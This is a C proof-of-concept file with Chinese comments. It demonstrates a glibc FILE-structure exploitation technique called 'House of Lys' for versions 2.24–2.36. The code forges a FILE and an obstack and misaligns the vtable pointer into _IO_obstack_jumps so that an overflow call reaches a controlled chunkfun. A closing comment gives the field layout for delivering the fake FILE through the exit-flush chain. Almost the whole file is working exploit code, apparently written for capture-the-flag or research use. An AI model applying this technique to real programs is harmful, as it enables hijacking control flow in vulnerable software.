#define _GNU_SOURCE

/*
 * House of Lys 的 shifted obstack vtable，适用于 glibc 2.24～2.36。
 *
 * 本项目对应构建中：_IO_obstack_jumps = _IO_wfile_jumps + 0x300。
 * 成功效果：错位后的 overflow 槽进入 obstack xsputn，最终调用 chunkfun。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

typedef int (*overflow_fn)(FILE *, int);

static int controlled_argument;

/* chunkfun 的函数地址就是最终被消费的 payload，因此必须单独定义。 */
static void *lys_chunkfun(void *extra_arg, long size)
{
    (void)size;
    assert(extra_arg == &controlled_argument);
    write(STDOUT_FILENO, "[+] Lys 回调命中\n",
          sizeof("[+] Lys 回调命中\n") - 1);
    _exit(0);
}

int main(void)
{
    setbuf(stdout, NULL);

    /* dlsym 只代替题目中的 libc 泄漏。 */
    overflow_fn call_overflow = dlsym(RTLD_DEFAULT, "__overflow");
    void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(call_overflow != NULL && wfile_jumps != NULL);

    /* glibc 2.24～2.36 目标构建中的固定相对偏移。 */
    uintptr_t obstack_jumps = (uintptr_t)wfile_jumps + 0x300;

    unsigned char fake_file[0x100] __attribute__((aligned(0x10)));
    uint64_t fake_obstack[0x60 / 8] __attribute__((aligned(0x10)));
    memset(fake_file, 0, sizeof(fake_file));
    memset(fake_obstack, 0, sizeof(fake_obstack));

    FILE *fp = (FILE *)fake_file;

    /* 保持窄字符路径，并让 overflow 条件成立。 */
    fp->_mode = -1;
    fp->_IO_write_ptr = (char *)1;
    fp->_IO_write_end = (char *)0;

    /* primary vtable 错位 +0x20，使 overflow 槽落到 obstack xsputn。 */
    *(void **)(fake_file + 0xd8) = (void *)(obstack_jumps + 0x20);

    /* FILE+0xe0 保存 fake obstack 的指针。 */
    *(void **)(fake_file + 0xe0) = fake_obstack;

    /* 设置 object_base、next_free 和 chunk_limit，强制进入 _obstack_newchunk。 */
    fake_obstack[0x10 / 8] = 0;
    fake_obstack[0x18 / 8] = 1;
    fake_obstack[0x20 / 8] = 0;

    /* 把 chunkfun 与 extra_arg 都改成受控值。 */
    fake_obstack[0x38 / 8] = (uintptr_t)lys_chunkfun;
    fake_obstack[0x48 / 8] = (uintptr_t)&controlled_argument;
    fake_obstack[0x50 / 8] = 1;

    /* 错位后的 xsputn 会把第三参数 rdx 当作长度，因此显式令 rdx=1。 */
    __asm__ volatile(
        "call *%[target]"
        :
        : [target] "r"(call_overflow), "D"(fp), "S"(EOF), "d"((size_t)1)
        : "rax", "rcx", "r8", "r9", "r10", "r11", "memory");

    /* chunkfun 命中后会 _exit(0)；执行到这里说明利用失败。 */
    _exit(1);
}

/*
 * ======================== exit/flush 布局伪代码 ========================
 *
 * 本文件已经实际验证“合法 obstack 表 +0x20 错位”会把 overflow 调用送进
 * xsputn，再进入 chunkfun。题目中还要完成 FILE 链投递：
 *
 *     fake_file._IO_write_base = 0；
 *     fake_file._IO_write_ptr = 1；
 *     fake_file._chain = 原 `_IO_list_all` 后继或 NULL；
 *     fake_file._lock = 可写零区；
 *     fake_file._mode = 0；
 *     fake_file.vtable = _IO_obstack_jumps + 0x20；
 *     fake_file[0xe0] = &fake_obstack；
 *
 *     fake_obstack.object_base = 0；
 *     fake_obstack.next_free = 1；
 *     fake_obstack.chunk_limit = 0；
 *     fake_obstack.chunkfun = 受控函数；
 *     fake_obstack.extra_arg = 第一个参数；
 *     fake_obstack.use_extra_arg = 1；
 *
 *     把 fake_file 挂入退出清理链；
 *     确认调用点残留的 rdx 可作为 xsputn 长度；
 *     调用 exit 或其他真实 flush 触发器；
 *
 * 2.37 删除旧 `_IO_obstack_xsputn` 消费路径，不能只改一个 vtable 偏移。
 */
